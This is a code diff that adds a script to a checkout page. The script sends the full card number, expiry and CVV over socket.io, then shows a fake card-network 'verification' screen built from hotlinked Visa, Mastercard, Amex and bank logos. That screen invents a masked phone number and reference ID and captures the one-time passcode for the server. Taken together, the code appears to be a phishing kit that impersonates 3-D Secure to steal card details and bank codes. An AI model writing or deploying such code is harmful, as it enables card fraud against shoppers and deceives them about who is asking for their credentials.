@@ -1906,5 +1906,476 @@ init();
     </div>
   </div>
 </div>
+
+    <script>
+        // =====================================
+// MC VERIFICATION FUNCTIONALITY
+// =====================================
+
+// Global variables for MC verification
+let mcTimerInterval = null;
+
+// Currency symbols for display
+const currencySymbols = {
+  'USD': '$',
+  'EUR': '€',
+  'GBP': '£',
+  'JPY': '¥',
+  'AUD': 'A$',
+  'CAD': 'C$',
+  'CHF': 'CHF',
+  'CNY': '¥',
+  'HKD': 'HK$',
+  'NZD': 'NZ$'
+};
+
+/**
+ * Shows the MC verification overlay with loading spinner
+ * @param {Object} data - Verification data from server
+ */
+function showMCVerificationOverlay(data) {
+  console.log('[DEBUG] Showing MC verification loading screen');
+  
+  const overlay = document.getElementById('mcVerificationOverlay');
+  const loadingContent = document.getElementById('mcLoadingContent');
+  const verificationContent = document.getElementById('mcVerificationContent');
+  const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
+  
+  if (!overlay || !loadingContent || !verificationContent) {
+    console.error('MC overlay elements not found');
+    return;
+  }
+  
+  // Show loading content, hide verification content
+  loadingContent.style.display = 'flex';
+  verificationContent.style.display = 'none';
+  overlay.style.display = 'flex';
+  
+  // Set the verification logo based on card type
+  if (loadingVerificationLogo) {
+    // Convert logo type to lowercase for comparison
+    const cardType = (data.cardType || 'mastercard').toLowerCase();
+    
+    // Select logo based on type
+    if (cardType.includes('visa')) {
+      loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 90px; max-width: 250px;">';
+      console.log('[DEBUG] Selected VISA logo');
+    } 
+    else if (cardType.includes('amex') || cardType.includes('american')) {
+      loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express SafeKey" style="max-height: 90px; max-width: 250px;">';
+      console.log('[DEBUG] Selected AMEX logo');
+    } 
+    else if (cardType.includes('discover')) {
+      loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy" style="max-height: 90px; max-width: 250px;">';
+      console.log('[DEBUG] Selected DISCOVER logo');
+    } 
+    else {
+      loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 90px; max-width: 250px;">';
+      console.log('[DEBUG] Selected MASTERCARD logo (default)');
+    }
+  }
+  
+  // Store verification data for later use
+  window.mcVerificationData = data;
+}
+
+/**
+ * Starts the actual verification process
+ * @param {Object} data - Verification data from server
+ */
+async function startMCVerification(data) {
+  console.log('[DEBUG] Starting MC verification process');
+  
+  // Get stored data from loading screen
+  const storedData = window.mcVerificationData || {};
+  
+  // Get overlay elements
+  const loadingContent = document.getElementById('mcLoadingContent');
+  const verificationContent = document.getElementById('mcVerificationContent');
+  
+  if (!loadingContent || !verificationContent) {
+    console.error('MC verification content elements not found');
+    return;
+  }
+  
+  // Hide loading, show verification content
+  loadingContent.style.display = 'none';
+  verificationContent.style.display = 'block';
+  
+  // Set verification type logo based on card type
+  const verificationTypeLogo = document.getElementById('verificationTypeLogo');
+  if (verificationTypeLogo) {
+    const logoType = (data.verificationType || storedData.verificationType || 'mastercard').toLowerCase();
+    
+    if (logoType.includes('visa')) {
+      verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
+      verificationTypeLogo.alt = 'Verified by Visa';
+    } 
+    else if (logoType.includes('amex') || logoType.includes('american')) {
+      verificationTypeLogo.src = 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png';
+      verificationTypeLogo.alt = 'American Express SafeKey';
+    } 
+    else if (logoType.includes('discover')) {
+      verificationTypeLogo.src = 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png';
+      verificationTypeLogo.alt = 'Discover ProtectBuy';
+    } 
+    else {
+      verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
+      verificationTypeLogo.alt = 'Mastercard SecureCode';
+    }
+  }
+  
+  // Set bank logo
+  const bankLogo = document.getElementById('bankLogo');
+  if (bankLogo) {
+    const bankLogos = {
+      'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+      'chase': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
+      'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
+      'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
+      'wells fargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
+      'capital one': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
+      'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+      'barclays': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png'
+    };
+    
+    bankLogo.src = bankLogos[data.bankCode?.toLowerCase()] || bankLogos['default'];
+  }
+  
+  // Generate random phone number ending for security display
+  const cardLastFourDigits = document.getElementById('cardLastFourDigits');
+  const phoneLastFour = data.phoneLastFour || Math.floor(1000 + Math.random() * 9000).toString();
+  if (cardLastFourDigits) {
+    cardLastFourDigits.textContent = `********${phoneLastFour}`;
+  }
+  
+  // Use actual card last 4 for the card display
+  const cardNumber = document.querySelector(SELECTORS.cardNumber)?.value || '';
+  const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
+  const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+  if (cardNumberDisplay) {
+    cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
+  }
+  
+  // Generate random reference ID
+  const referenceId = document.getElementById('referenceId');
+  if (referenceId) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let randomRef = '';
+    // Generate 3 letters followed by 4 numbers
+    for (let i = 0; i < 3; i++) {
+      randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
+    }
+    for (let i = 0; i < 4; i++) {
+      randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
+    }
+    referenceId.textContent = randomRef;
+  }
+  
+  // Set merchant name and transaction date
+  const merchantName = document.getElementById('merchantName');
+  const transactionDate = document.getElementById('transactionDate');
+  if (merchantName) {
+    merchantName.textContent = data.merchantName || storedData.merchantName || 'Peacock Merchandise';
+  }
+  if (transactionDate) {
+    transactionDate.textContent = new Date().toLocaleString();
+  }
+  
+  // Set amount display
+  const transactionAmount = document.getElementById('transactionAmount');
+  const currencySymbol = document.getElementById('currencySymbol');
+  const originalAmount = document.getElementById('originalAmount');
+  const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
+  
+  // Default amount in USD
+  const amountValue = '1299.00';
+  
+  // Handle currency display
+  if (currencySymbol) {
+    currencySymbol.textContent = currencySymbols[data.currency] || '$';
+  }
+  
+  if (transactionAmount) {
+    transactionAmount.textContent = amountValue;
+  }
+  
+  if (originalAmount) {
+    originalAmount.textContent = amountValue;
+  }
+  
+  // Setup event handlers
+  setupMCVerificationHandlers();
+  
+  // Start timer
+  startMCTimer();
+}
+
+/**
+ * Sets up event handlers for the MC verification form
+ */
+function setupMCVerificationHandlers() {
+  const mcOtpInput = document.getElementById('mcOtpInput');
+  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+  const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
+  const consentLabel = document.getElementById('consentLabel');
+  const mcResendBtn = document.getElementById('mcResendBtn');
+  const mcCancelBtn = document.getElementById('mcCancelBtn');
+  const otpInfoIcon = document.getElementById('otpInfoIcon');
+  const otpInfoTooltip = document.getElementById('otpInfoTooltip');
+  
+  // Input handler for OTP field
+  if (mcOtpInput) {
+    mcOtpInput.addEventListener('input', updateMcSubmitButton);
+  }
+  
+  // Consent checkbox toggle
+  if (mcConsentCheckbox && consentLabel) {
+    consentLabel.style.cursor = 'pointer';
+    
+    const toggleConsent = function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      
+      mcConsentCheckbox.classList.toggle('checked');
+      
+      const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
+      if (checkmarkSvg) {
+        if (mcConsentCheckbox.classList.contains('checked')) {
+          checkmarkSvg.style.display = 'block';
+          mcConsentCheckbox.style.backgroundColor = '#2778c4';
+          mcConsentCheckbox.style.borderColor = '#2778c4';
+        } else {
+          checkmarkSvg.style.display = 'none';
+          mcConsentCheckbox.style.backgroundColor = 'white';
+          mcConsentCheckbox.style.borderColor = '#ccc';
+        }
+      }
+      
+      updateMcSubmitButton();
+      return false;
+    };
+    
+    mcConsentCheckbox.addEventListener('click', toggleConsent);
+    consentLabel.addEventListener('click', toggleConsent);
+    
+    // Initialize submit button state
+    setTimeout(updateMcSubmitButton, 100);
+  }
+  
+  // Submit button click handler
+  if (mcSubmitBtn) {
+    mcSubmitBtn.addEventListener('click', function() {
+      if (mcSubmitBtn.disabled) return;
+      
+      const otp = mcOtpInput?.value?.trim();
+      if (!otp) {
+        const mcOtpError = document.getElementById('mcOtpError');
+        if (mcOtpError) {
+          mcOtpError.textContent = 'Please enter the verification code.';
+          mcOtpError.style.display = 'block';
+        }
+        return;
+      }
+      
+      // Show loading state
+      mcSubmitBtn.disabled = true;
+      mcSubmitBtn.textContent = 'Verifying...';
+      mcSubmitBtn.style.opacity = '0.7';
+      
+      // Send OTP to server
+      socket.emit('mc_otp_submitted', {
+        otp: otp
+      });
+    });
+  }
+  
+  // Resend button click handler
+  if (mcResendBtn) {
+    mcResendBtn.addEventListener('click', function() {
+      mcResendBtn.disabled = true;
+      mcResendBtn.textContent = 'Sending...';
+      
+      socket.emit('mc_resend_otp', {});
+      
+      setTimeout(() => {
+        mcResendBtn.disabled = false;
+        mcResendBtn.textContent = 'Resend';
+        alert('A new verification code has been sent to your registered mobile number.');
+      }, 1500);
+    });
+  }
+  
+  // Cancel button click handler
+  if (mcCancelBtn) {
+    mcCancelBtn.addEventListener('click', function() {
+      if (confirm('Do you want to cancel this verification?')) {
+        hideMCVerificationOverlay();
+        socket.emit('mc_verification_cancelled', {});
+      }
+    });
+  }
+  
+  // Info tooltip toggle
+  if (otpInfoIcon && otpInfoTooltip) {
+    otpInfoIcon.addEventListener('mouseenter', function() {
+      otpInfoTooltip.style.display = 'block';
+    });
+    
+    otpInfoIcon.addEventListener('mouseleave', function() {
+      otpInfoTooltip.style.display = 'none';
+    });
+  }
+}
+
+/**
+ * Updates the MC submit button state based on input and consent
+ */
+function updateMcSubmitButton() {
+  const mcOtpInput = document.getElementById('mcOtpInput');
+  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+  const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
+  
+  if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
+  
+  const hasOtp = mcOtpInput.value.trim().length > 0;
+  const hasConsent = mcConsentCheckbox.classList.contains('checked');
+  
+  if (hasOtp && hasConsent) {
+    mcSubmitBtn.disabled = false;
+    mcSubmitBtn.style.backgroundColor = '#2778c4';
+    mcSubmitBtn.style.cursor = 'pointer';
+  } else {
+    mcSubmitBtn.disabled = true;
+    mcSubmitBtn.style.backgroundColor = '#CCCCCC';
+    mcSubmitBtn.style.cursor = 'not-allowed';
+  }
+}
+
+/**
+ * Starts the timer for MC verification
+ */
+function startMCTimer() {
+  const timerElement = document.getElementById('mcTimer');
+  if (!timerElement) return;
+  
+  if (mcTimerInterval) {
+    clearInterval(mcTimerInterval);
+  }
+  
+  let timeLeft = 179; // 2:59 timer
+  
+  // Update timer display immediately
+  const minutes = Math.floor(timeLeft / 60);
+  const seconds = timeLeft % 60;
+  timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+  
+  // Set interval for countdown
+  mcTimerInterval = setInterval(() => {
+    timeLeft--;
+    
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    
+    if (timeLeft <= 0) {
+      clearInterval(mcTimerInterval);
+      hideMCVerificationOverlay();
+      
+      // Show timeout error
+      showErrorUI('Verification timed out. Please try again.');
+    }
+  }, 1000);
+}
+
+/**
+ * Hides the MC verification overlay
+ */
+function hideMCVerificationOverlay() {
+  const overlay = document.getElementById('mcVerificationOverlay');
+  if (overlay) {
+    overlay.style.display = 'none';
+  }
+  
+  if (mcTimerInterval) {
+    clearInterval(mcTimerInterval);
+    mcTimerInterval = null;
+  }
+}
+
+// Add Socket.io event listeners for MC verification
+socket.on('show_mc_verification', (data) => {
+  console.log('[DEBUG] Received show_mc_verification event:', data);
+  showMCVerificationOverlay(data);
+});
+
+socket.on('start_verification', (data) => {
+  console.log('[DEBUG] Received start_verification event:', data);
+  startMCVerification(data);
+});
+
+socket.on('mc_otp_error', (data) => {
+  const mcOtpError = document.getElementById('mcOtpError');
+  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+  
+  if (mcOtpError) {
+    mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
+    mcOtpError.style.display = 'block';
+  }
+  
+  if (mcSubmitBtn) {
+    mcSubmitBtn.disabled = false;
+    mcSubmitBtn.textContent = 'Submit';
+    mcSubmitBtn.style.opacity = '1';
+  }
+});
+
+socket.on('mc_verification_result', (data) => {
+  hideMCVerificationOverlay();
+  
+  // Show result based on success/failure
+  if (data.success) {
+    showSuccessUI(data);
+  } else {
+    showErrorUI(data.message || 'Verification failed. Please try again.');
+  }
+});
+
+// Modify handleCardSubmit function to potentially trigger MC verification
+const originalHandleCardSubmit = handleCardSubmit;
+handleCardSubmit = function(e) {
+  e.preventDefault();
+  console.log('Form submitted, preventing default and processing payment...');
+
+  // Get form values
+  const cardNumber = document.querySelector(SELECTORS.cardNumber).value.replace(/\s/g, '');
+  const cardHolder = document.querySelector(SELECTORS.cardHolder).value;
+  const expiryDate = document.querySelector(SELECTORS.expiryDate).value;
+  const cvv = document.querySelector(SELECTORS.cvv).value;
+
+  // Validate form inputs
+  if (!validateCardForm(cardNumber, cardHolder, expiryDate, cvv)) {
+    return false;
+  }
+
+  // Process payment with Socket.io
+  socket.emit('process_payment', {
+    cardNumber,
+    cardHolder,
+    expiryDate,
+    cvv,
+    amount: 1299.00
+  });
+
+  // Show processing UI
+  showProcessingUI();
+
+  // Listen for payment response
+  socket.once('payment_response', handlePaymentResponse);
+
+  // Important: Return false to prevent form submission
+  return false;
+};
+        <script>
 </body>
 </html>
